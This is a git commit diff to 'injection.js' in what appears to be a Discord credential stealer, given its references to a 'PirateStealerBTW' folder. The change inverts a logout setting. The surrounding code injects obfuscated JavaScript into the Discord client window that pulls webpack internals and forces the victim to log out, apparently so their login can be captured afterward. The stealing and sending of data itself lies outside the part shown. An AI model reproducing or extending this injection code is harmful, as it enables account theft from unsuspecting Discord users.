4333473aabaf898f72345efbb78b26de97e80ca7
kyssuuwuas <128225295+kyssuuwuas@users.noreply.github.com>
2023-04-08 16:23:43 +0200

    Update injection.js

--- injection.js
+++ injection.js
@@ -180,7 +180,7 @@ async function firstTime() {
     if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return true
 
     fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
-    if (config.logout != "false" && config.logout != "%LOGOUT%") {
+    if (config.logout != "true" && config.logout != "%LOGOUT%") {
 
         const window = BrowserWindow.getAllWindows()[0];
         window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`)
